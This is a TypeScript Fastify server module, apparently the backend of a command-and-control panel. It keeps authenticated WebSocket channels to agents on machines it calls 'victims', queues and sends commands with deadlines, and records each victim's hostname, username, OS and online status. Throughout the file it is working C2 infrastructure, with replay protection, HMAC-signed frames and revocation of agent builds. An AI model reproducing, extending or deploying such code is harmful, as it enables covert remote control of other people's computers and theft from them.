import type { FastifyPluginAsync, FastifyRequest } from 'fastify';
import type { WebSocket } from 'ws';
import { randomBytes, randomUUID } from 'node:crypto';
import { prisma } from '../lib/db';
import { authenticateVictim } from '../plugins/victim-auth';
import { publish } from '../lib/bus';
import { applyEvent } from '../lib/ws-events';
import { applyTaskResult, type ResultBody } from '../lib/task-result';
import { consumeTicket, issueTicket, TICKET_TTL_MS } from '../lib/ws-ticket';
import {
  checkHmac,
  checkShape,
  deriveKeys,
  FRAME_BURST,
  FRAME_LIMIT_PER_MIN,
  HANDSHAKE_MS,
  isInboundType,
  MAX_FRAME,
  parseFrame,
  PONG_DEADLINE_MS,
  SKEW_SEC,
  buildFrame,
  type Field,
  type Keys,
  type ParseFailure
} from '../lib/ws-protocol';
import { floor, loadCursors, pruneSeen, remember, saveSeq } from '../lib/ws-state';
import { expireQueued } from '../lib/tasks';

const TICKET_RATE = 12;
const SEEN_PRUNE_EVERY = 64;
const NONCE_TTL_MS = 600_000;

type Stage = 'hello_ack' | 'hello' | 'ready';

type Conn = {
  socket: WebSocket;
  victimId: string;
  keys: Keys;
  outSeq: number;
  lastIn: number;
  inFloor: number;
  lastPingAt: number;
  lastInboundAt: number;
  stage: Stage;
  helloId: string | null;
  closed: boolean;
  expelled: boolean;
  accepted: number;
  nonces: Map<string, number>;
  outstanding: Map<string, number>;
  tokens: number;
  refillAt: number;
  queue: Promise<void>;
  writes: Promise<void>;
  handshakeTimer: NodeJS.Timeout | null;
  pongTimer: NodeJS.Timeout | null;
  log: FastifyRequest['log'];
};

const hub = new Map<string, Conn>();
/**
 * reply_to -> task, across sockets: a result replayed after a reconnect keeps
 * the old reply_to, and a timeout must still drop it later. This window is
 * only an in-memory shortcut; the durable dedup is the terminal task row.
 */
const origins = new Map<string, { victimId: string; taskId: string; unknownOnTimeout: boolean; timer: NodeJS.Timeout }>();
const dropped = new Map<string, number>();
let sweeper: NodeJS.Timeout | null = null;

function unsignedFrame(): string {
  return randomBytes(16).toString('base64url');
}

function nowSec(): number {
  return Math.floor(Date.now() / 1000);
}

function send(conn: Conn, type: string, fields: Array<[string, Field]> = []): string {
  const id = randomUUID();
  const seq = conn.outSeq++;
  const frame = buildFrame(conn.keys.c2a, { id, seq, ts: nowSec(), type, nonce: unsignedFrame() }, fields);
  if (conn.socket.readyState === conn.socket.OPEN) conn.socket.send(frame);
  // Only frames the peer must ACK feed the outbound cursor.
  if (type === 'hello_ok' || type === 'cmd' || type === 'result') conn.outstanding.set(id, seq);
  return id;
}

/** Persist the outbound cursor only once the peer acknowledged the frame. */
function acknowledged(conn: Conn, replyTo: string): void {
  const seq = conn.outstanding.get(replyTo);
  if (seq === undefined) return;
  conn.outstanding.delete(replyTo);
  if (conn.expelled || conn.closed) return;
  conn.writes = conn.writes.then(() => saveSeq(conn.victimId, 'a2c', seq)).catch(() => undefined);
}

function ack(conn: Conn, replyTo: string): void {
  send(conn, 'ack', [['reply_to', replyTo]]);
}

type Dispatchable = { id: string; victimId: string; name: string; params: unknown; timeoutSec: number };

/** True while the panel still accepts results for this reply_to. */
function isDropped(replyTo: string): boolean {
  const until = dropped.get(replyTo);
  if (until === undefined) return false;
  if (until <= Date.now()) {
    dropped.delete(replyTo);
    return false;
  }
  return true;
}

function inFlight(conn: Conn): number {
  let count = 0;
  for (const pending of origins.values()) if (pending.victimId === conn.victimId) count += 1;
  return count;
}

/**
 * Send one `cmd` for a queued task. The deadline is applied on both ends and
 * a later result is dropped. Returns false when the victim has no ready
 * socket, so the caller can answer agent_offline.
 *
 * The four-in-flight limit is enforced by the agent, not here: the panel sends
 * every cmd and counts origins only for the UI and the handshake flush.
 */
export async function dispatchCommand(task: Dispatchable): Promise<boolean> {
  const conn = hub.get(task.victimId);
  return conn ? dispatchTask(conn, task) : false;
}

/** True when the device has a ready control socket. */
export function hasControl(victimId: string): boolean {
  const conn = hub.get(victimId);
  return Boolean(conn && !conn.closed && conn.stage === 'ready' && conn.socket.readyState === conn.socket.OPEN);
}

export async function dispatchTask(conn: Conn, task: Dispatchable): Promise<boolean> {
  // The passed conn may have been superseded between the caller's lookup and
  // here; always send on the socket the hub currently owns.
  const target = hub.get(task.victimId);
  if (!target || !hasControl(task.victimId)) return false;
  const timeoutMs = Math.max(1_000, Math.min(300_000, task.timeoutSec * 1_000));
  const reconnect = task.name === 'agent' && (task.params as { command?: string }).command === 'reconnect';
  const claimed = await prisma.task.updateMany({
    where: { id: task.id, status: 'queued' },
    data: { status: 'running', leaseUntil: new Date(Date.now() + timeoutMs), attempts: { increment: 1 } }
  });
  if (claimed.count === 0) return true;
  const replyTo = send(target, 'cmd', [
    ['name', task.name],
    ['args', task.params as Field],
    ['task_id', task.id],
    ['timeout_ms', timeoutMs]
  ]);
  const timer = setTimeout(() => {
    origins.delete(replyTo);
    dropped.set(replyTo, Date.now() + 60_000);
    if (dropped.size > 4096) {
      for (const [key, until] of dropped) if (until <= Date.now() || dropped.size > 2048) dropped.delete(key);
    }
    const status = reconnect ? 'unknown' : 'error';
    void prisma.task.updateMany({
      where: { id: task.id, status: { in: ['queued', 'running'] } },
      data: { status, error: reconnect ? 'unknown: no result before the deadline' : 'timeout', result: {}, finishedAt: new Date(), leaseUntil: null }
    }).then(() => publish({ type: 'task.update', victimId: conn.victimId, at: Date.now(), data: { id: task.id, status } })).catch(() => undefined);
    // Any terminal state advances the FIFO chain, not only a result frame.
    void flushQueued(conn, 1).catch(() => undefined);
  }, timeoutMs + 5_000);
  origins.set(replyTo, { victimId: conn.victimId, taskId: task.id, unknownOnTimeout: reconnect, timer });
  return true;
}

/**
 * FIFO handoff of scheduled work, four at a time. The hello starts the chain
 * and every result pulls one more. Expired slots never run. Flushes for one
 * device are serialized so concurrent results cannot overshoot the limit.
 */
const flushes = new Map<string, Promise<void>>();

function flushQueued(conn: Conn, limit = 4): Promise<void> {
  const previous = flushes.get(conn.victimId) ?? Promise.resolve();
  const next = previous.then(() => doFlush(conn, limit)).catch(() => undefined);
  flushes.set(conn.victimId, next);
  return next;
}

async function doFlush(conn: Conn, limit: number): Promise<void> {
  await expireQueued(conn.victimId);
  const room = Math.min(limit, 4 - inFlight(conn));
  if (room <= 0) return;
  const tasks = await prisma.task.findMany({
    where: { victimId: conn.victimId, status: 'queued', notBefore: { lte: new Date() } },
    orderBy: [{ createdAt: 'asc' }, { id: 'asc' }],
    take: room
  });
  for (const task of tasks) {
    if (conn.closed) return;
    await dispatchTask(conn, task).catch(() => undefined);
  }
}

function stopTimers(conn: Conn): void {
  if (conn.handshakeTimer) clearTimeout(conn.handshakeTimer);
  if (conn.pongTimer) clearInterval(conn.pongTimer);
  conn.handshakeTimer = null;
  conn.pongTimer = null;
}

function handshakeDeadline(conn: Conn): void {
  if (conn.handshakeTimer) clearTimeout(conn.handshakeTimer);
  conn.handshakeTimer = setTimeout(() => closeWith(conn, 4408, 'handshake timeout'), HANDSHAKE_MS);
}

function closeWith(conn: Conn, code: number, reason: string): void {
  if (conn.closed) return;
  conn.closed = true;
  stopTimers(conn);
  if (conn.socket.readyState === conn.socket.OPEN) {
    try {
      send(conn, 'bye', [['code', code], ['reason', reason.slice(0, 120)]]);
    } catch {
      // socket already tearing down
    }
    conn.socket.close(code, reason.slice(0, 120));
  }
  if (hub.get(conn.victimId) === conn) hub.delete(conn.victimId);
  if (!conn.expelled) {
    void prisma.victim.update({ where: { id: conn.victimId }, data: { status: 'offline' } }).catch(() => undefined);
    void publish({ type: 'victim.heartbeat', victimId: conn.victimId, at: Date.now(), data: { status: 'offline' } });
  }
}

function reject(conn: Conn, failure: ParseFailure): void {
  if (failure.code === 4401) {
    conn.log.warn({ code: 4401, device_id: conn.victimId, seq: failure.seq, length: failure.length }, 'ws auth rejected');
  }
  closeWith(conn, failure.code, failure.reason);
}

function budget(conn: Conn): boolean {
  const now = Date.now();
  conn.tokens = Math.min(FRAME_BURST, conn.tokens + ((now - conn.refillAt) / 60_000) * FRAME_LIMIT_PER_MIN);
  conn.refillAt = now;
  if (conn.tokens < 1) return false;
  conn.tokens -= 1;
  return true;
}

function pruneNonces(conn: Conn): void {
  const cutoff = Date.now() - NONCE_TTL_MS;
  for (const [nonce, at] of conn.nonces) {
    if (at > cutoff && conn.nonces.size <= 600) break;
    conn.nonces.delete(nonce);
  }
}

function numeric(value: unknown): number {
  return typeof value === 'number' && Number.isSafeInteger(value) && value >= 0 ? value : 0;
}

async function onFrame(conn: Conn, raw: Buffer): Promise<void> {
  if (conn.closed) return;
  const parsed = parseFrame(raw);
  if (!parsed.ok) return reject(conn, parsed.failure);
  const frame = parsed.frame;
  const json = frame.json;
  conn.log.debug({ seq: frame.seq, type: json.type }, 'frame');

  if (!checkHmac(conn.keys.a2c, frame)) {
    return reject(conn, { code: 4401, reason: 'bad_hmac', seq: frame.seq, length: raw.length });
  }

  const id = String(json.id);
  if (!(await remember(conn.victimId, 'c2a', id, frame.seq))) {
    if (json.type === 'ping') send(conn, 'pong', [['reply_to', id]]);
    else if (json.type !== 'bye') ack(conn, id);
    return;
  }
  if (conn.closed) return;

  if (conn.nonces.has(frame.nonce)) return reject(conn, { code: 4400, reason: 'nonce_reused', seq: frame.seq, length: raw.length });
  pruneNonces(conn);
  conn.nonces.set(frame.nonce, Date.now());

  if (frame.seq <= conn.inFloor) return reject(conn, { code: 4400, reason: 'seq_below_floor', seq: frame.seq, length: raw.length });
  if (frame.seq <= conn.lastIn) return reject(conn, { code: 4400, reason: 'seq_replay', seq: frame.seq, length: raw.length });
  conn.lastIn = frame.seq;
  await saveSeq(conn.victimId, 'c2a', frame.seq);
  if (conn.closed) return;

  const ts = numeric(json.ts);
  if (Math.abs(nowSec() - ts) > SKEW_SEC) return reject(conn, { code: 4400, reason: 'clock_skew', seq: frame.seq, length: raw.length });

  const type = json.type;
  if (!isInboundType(type)) return reject(conn, { code: 4400, reason: 'unknown_type', seq: frame.seq, length: raw.length });
  const shapeError = checkShape(json);
  if (shapeError) return reject(conn, { code: 4400, reason: shapeError, seq: frame.seq, length: raw.length });

  if (conn.stage === 'hello_ack' && type !== 'ack' && type !== 'bye') {
    return reject(conn, { code: 4400, reason: 'expected_ack', seq: frame.seq, length: raw.length });
  }

  if (type !== 'ping' && !budget(conn)) {
    send(conn, 'bye', [['code', 4429], ['reason', 'retry_after_ms=1000']]);
    conn.closed = true;
    stopTimers(conn);
    if (hub.get(conn.victimId) === conn) hub.delete(conn.victimId);
    conn.socket.close(4429, 'rate limit');
    return;
  }

  conn.lastInboundAt = Date.now();
  conn.accepted += 1;

  switch (type) {
    case 'ack': {
      acknowledged(conn, String(json.reply_to));
      if (conn.stage === 'hello_ack' && json.reply_to === conn.helloId) {
        conn.stage = 'hello';
        handshakeDeadline(conn);
      }
      break;
    }
    case 'hello': {
      if (conn.stage !== 'hello') break;
      const peerFloor = numeric(json.expect_seq_in);
      if (peerFloor >= conn.outSeq) conn.outSeq = peerFloor + 1;
      ack(conn, id);
      conn.stage = 'ready';
      stopTimers(conn);
      conn.lastPingAt = Date.now();
      conn.pongTimer = setInterval(() => {
        if (Date.now() - conn.lastPingAt > PONG_DEADLINE_MS) closeWith(conn, 4408, 'pong timeout');
      }, 5_000);
      await applyHello(conn, json);
      void flushQueued(conn).catch(() => undefined);
      break;
    }
    case 'result': {
      ack(conn, id);
      const replyTo = String(json.reply_to);
      const pending = origins.get(replyTo);
      conn.log.debug({ reply_to: replyTo, pending: Boolean(pending), origins: origins.size }, 'ws result');
      if (!pending) {
        if (isDropped(replyTo)) conn.log.debug({ device_id: conn.victimId, task_id: replyTo }, 'late result dropped');
        else conn.log.debug({ device_id: conn.victimId, reply_to: replyTo }, 'result without a pending cmd');
        void flushQueued(conn, 1).catch(() => undefined);
        break;
      }
      clearTimeout(pending.timer);
      origins.delete(replyTo);
      const outcome = await applyTaskResult(conn.victimId, pending.taskId, json.body as ResultBody);
      if (outcome === 'conflict') conn.log.debug({ device_id: conn.victimId, task_id: pending.taskId }, 'duplicate result ignored');
      void flushQueued(conn, 1).catch(() => undefined);
      break;
    }
    case 'event': {
      ack(conn, id);
      await applyEvent(conn.victimId, {
        kind: String(json.kind),
        data: (json.data ?? {}) as Record<string, unknown>,
        legacy: String(json.legacy ?? '')
      });
      break;
    }
    case 'ping': {
      conn.lastPingAt = Date.now();
      send(conn, 'pong', [['reply_to', id]]);
      break;
    }
    case 'bye': {
      conn.closed = true;
      stopTimers(conn);
      if (hub.get(conn.victimId) === conn) hub.delete(conn.victimId);
      conn.socket.close(Number(json.code), String(json.reason ?? '').slice(0, 120));
      break;
    }
  }
  if (conn.accepted % SEEN_PRUNE_EVERY === 0) void pruneSeen(conn.victimId, 'c2a').catch(() => undefined);
}

async function applyHello(conn: Conn, json: Record<string, unknown>): Promise<void> {
  const agent = typeof json.agent === 'string' ? json.agent.slice(0, 32) : '';
  await prisma.victim.update({
    where: { id: conn.victimId },
    data: {
      hostname: String(json.hostname ?? '').slice(0, 128) || undefined,
      username: String(json.user ?? '').slice(0, 128) || undefined,
      os: (() => {
        const raw = String(json.os ?? '').slice(0, 160);
        if (!raw) return undefined;
        return /win/i.test(raw) ? 'windows' : /mac|darwin/i.test(raw) ? 'macos' : /linux/i.test(raw) ? 'linux' : raw;
      })(),
      agentVersion: agent || undefined,
      status: 'online',
      lastAgentMessageAt: new Date(),
      lastHeartbeatAt: new Date()
    }
  }).catch(() => undefined);
  void publish({ type: 'victim.heartbeat', victimId: conn.victimId, at: Date.now(), data: { status: 'online', first: json.first === true } });
}

export const wsRoutes: FastifyPluginAsync = async (app) => {
  if (!sweeper) {
    // Scheduled tasks must start when their slot arrives on an idle-but-live
    // socket; the chain after each result covers the rest.
    sweeper = setInterval(() => {
      for (const conn of hub.values()) void flushQueued(conn, 4).catch(() => undefined);
    }, 5_000);
    sweeper.unref();
  }

  app.post('/ws-ticket', {
    preHandler: authenticateVictim,
    config: {
      rateLimit: {
        max: TICKET_RATE,
        timeWindow: '1 minute',
        keyGenerator: (request: FastifyRequest) => {
          const id = request.headers['x-victim-id'];
          return `ws-ticket:${typeof id === 'string' && id ? id : request.clientIp}`;
        }
      }
    }
  }, async (request, reply) => {
    const victim = request.victim!;
    const ticket = issueTicket(victim.id);
    return reply.code(201).send({
      ticket: ticket.value,
      expires_in: Math.floor(TICKET_TTL_MS / 1000),
      handshake_nonce: ticket.nonce,
      device_id: victim.id
    });
  });

  app.route({
    method: 'GET',
    url: '/ws',
    config: { rateLimit: false },
    handler: async (_request, reply) => reply.code(426).send({ error: 'upgrade_required', message: 'websocket upgrade required' }),
    wsHandler: connect
  });
};

function connect(socket: WebSocket, request: FastifyRequest): void {
  const t0 = Date.now();
  socket.on('close', (code: number) => request.log.debug({ code, ms: Date.now() - t0 }, 'ws close event'));
  const query = request.query as { ticket?: string; device_id?: string; expect_seq_in?: string };
  const log = request.log;
  void (async () => {
    const missing = (): void => {
      log.warn({ code: 4401, device_id: query.device_id, seq: undefined, length: 0 }, 'ws auth rejected');
      socket.close(4401, 'auth');
    };
    if (typeof query.ticket !== 'string' || !/^[A-Za-z0-9_-]{43}$/.test(query.ticket)
      || typeof query.device_id !== 'string' || !/^[0-9a-f-]{36}$/.test(query.device_id)) {
      return missing();
    }
      const consumed = consumeTicket(query.ticket, query.device_id);
      if (!consumed.ok) {
        if (!consumed.ticket) return missing();
        // The ticket is gone but its nonce survives briefly: sign a clean 4401.
        const keys = deriveKeys(consumed.ticket.value, consumed.ticket.nonce);
        const seq = 1;
        const frame = buildFrame(keys.c2a, { id: randomUUID(), seq, ts: nowSec(), type: 'bye', nonce: unsignedFrame() }, [['code', 4401], ['reason', consumed.reason]]);
        try {
          socket.send(frame);
        } catch {
          // ignore
        }
        log.warn({ code: 4401, device_id: query.device_id, seq: undefined, length: 0, reason: consumed.reason }, 'ws auth rejected');
          socket.close(4401, consumed.reason);
        return;
      }

      const victimId = consumed.ticket.deviceId;
      const cursors = await loadCursors(victimId);
      const state = await prisma.victim.findUnique({ where: { id: victimId }, select: { revokedAt: true, build: { select: { revokedAt: true, status: true } } } }).catch(() => null);
      if (!state) {
          socket.close(4401, 'unknown device');
        return;
      }
      if (state.revokedAt || state.build.revokedAt || state.build.status === 'revoked') {
        const keys = deriveKeys(consumed.ticket.value, consumed.ticket.nonce);
        const frame = buildFrame(keys.c2a, { id: randomUUID(), seq: 1, ts: nowSec(), type: 'bye', nonce: unsignedFrame() }, [['code', 4403], ['reason', 'revoked']]);
        try {
          socket.send(frame);
        } catch {
          // ignore
        }
          socket.close(4403, 'revoked');
        return;
      }

      const expectIn = numeric(Number(query.expect_seq_in));
      const conn: Conn = {
        socket,
        victimId,
        keys: deriveKeys(consumed.ticket.value, consumed.ticket.nonce),
        outSeq: Math.max(cursors.out, expectIn) + 1,
        lastIn: cursors.in,
        inFloor: floor(cursors.in),
        lastPingAt: Date.now(),
        lastInboundAt: Date.now(),
        stage: 'hello_ack',
        helloId: null,
        closed: false,
        expelled: false,
        accepted: 0,
        nonces: new Map(),
        outstanding: new Map(),
        tokens: FRAME_BURST,
        refillAt: Date.now(),
        queue: Promise.resolve(),
        writes: Promise.resolve(),
        handshakeTimer: null,
        pongTimer: null,
        log
      };

      const previous = hub.get(victimId);
      if (previous && previous !== conn) {
        previous.expelled = true;
        try {
          previous.socket.send(buildFrame(previous.keys.c2a, { id: randomUUID(), seq: previous.outSeq++, ts: nowSec(), type: 'bye', nonce: unsignedFrame() }, [['code', 4409], ['reason', 'superseded']]));
          previous.socket.close(4409, 'superseded');
        } catch {
          // already closing
        }
        previous.closed = true;
        stopTimers(previous);
        hub.delete(victimId);
      }
      hub.set(victimId, conn);

      conn.helloId = send(conn, 'hello_ok', [
        ['server_time', nowSec()],
        ['heartbeat_sec', 30],
        ['poll_sec', 20],
        ['expect_seq_in', cursors.in],
        ['expect_seq_out', cursors.out]
      ]);
      handshakeDeadline(conn);

      socket.on('message', (data: Buffer | string, isBinary: boolean) => {
        const raw = typeof data === 'string' ? Buffer.from(data, 'utf8') : data;
        if (isBinary && raw.length > MAX_FRAME) return reject(conn, { code: 4400, reason: 'frame_too_large', length: raw.length });
        conn.queue = conn.queue
          .then(() => onFrame(conn, raw))
          .catch((error: unknown) => {
            conn.log.error(error);
            closeWith(conn, 4500, 'internal');
          });
      });
      socket.on('close', () => {
        conn.closed = true;
        stopTimers(conn);
        if (hub.get(victimId) === conn) hub.delete(victimId);
        if (!conn.expelled) {
          void prisma.victim.update({ where: { id: victimId }, data: { status: 'offline' } }).catch(() => undefined);
          void publish({ type: 'victim.heartbeat', victimId, at: Date.now(), data: { status: 'offline' } });
        }
      });
      socket.on('error', (error: Error) => conn.log.debug({ err: error.message, device_id: victimId }, 'ws error'));
    })().catch((error: unknown) => {
      log.error(error);
      try {
          socket.close(4500, 'internal');
      } catch {
        // ignore
      }
    });
}
